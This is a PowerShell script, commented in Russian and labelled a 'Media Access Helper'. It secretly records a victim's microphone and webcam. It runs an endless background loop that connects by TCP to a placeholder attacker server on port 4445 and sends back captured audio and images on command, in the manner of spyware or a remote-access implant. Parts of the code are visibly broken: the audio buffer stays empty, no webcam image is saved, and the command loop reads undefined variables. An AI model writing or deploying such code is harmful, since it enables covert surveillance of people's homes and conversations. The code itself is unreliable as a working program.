# Media Access Helper - доступ к микрофону и камере

function Record-Audio {
    param([int]$Duration = 10)
    
    try {
        Add-Type -AssemblyName System.Speech
        $recognition = New-Object System.Speech.Recognition.SpeechRecognitionEngine
        $stream = New-Object System.IO.MemoryStream
        
        # Запись аудио
        $recognition.SetInputToDefaultAudioDevice()
        $recognition.RecognizeAsync()
        
        Start-Sleep -Seconds $Duration
        $recognition.RecognizeAsyncStop()
        
        return $stream.ToArray()
    }
    catch {
        return $null
    }
}

function Capture-Webcam {
    try {
        # Использование Windows Camera API
        $photoPath = "$env:TEMP\webcam_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
        
        # Альтернативный метод через PowerShell
        $code = @"
        using System;
        using System.Drawing;
        using System.Drawing.Imaging;
        using System.Runtime.InteropServices;
        
        public class WebcamCapture {
            [DllImport("avicap32.dll")]
            static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, IntPtr hWndParent, int nID);
            
            [DllImport("user32")]
            static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
            
            public static bool CaptureImage(string savePath) {
                try {
                    IntPtr hWnd = capCreateCaptureWindowA("Webcam", 0, 0, 0, 320, 240, IntPtr.Zero, 0);
                    SendMessage(hWnd, 0x40a, 0, 0);
                    SendMessage(hWnd, 0x40a, 0, 0);
                    return true;
                } catch { return false; }
            }
        }
"@
        Add-Type -TypeDefinition $code -Language CSharp
        [WebcamCapture]::CaptureImage($photoPath)
        
        if (Test-Path $photoPath) {
            return (Get-Content $photoPath -Encoding Byte -Raw)
        }
    }
    catch {
        return $null
    }
}

# Фоновая служба медиа-доступа
while($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient("ВАШ_IP_СЕРВЕРА",4445)
        $stream = $client.GetStream()
        
        while($true) {
            $command = [System.Text.Encoding]::ASCII.GetString($bytes,0,$i)
            
            if ($command -eq "record_audio") {
                $audioData = Record-Audio -Duration 10
                $stream.Write($audioData, 0, $audioData.Length)
            }
            elseif ($command -eq "capture_webcam") {
                $imageData = Capture-Webcam
                $stream.Write($imageData, 0, $imageData.Length)
            }
        }
        $client.Close()
    }
    catch {
        Start-Sleep -Seconds 60
    }
}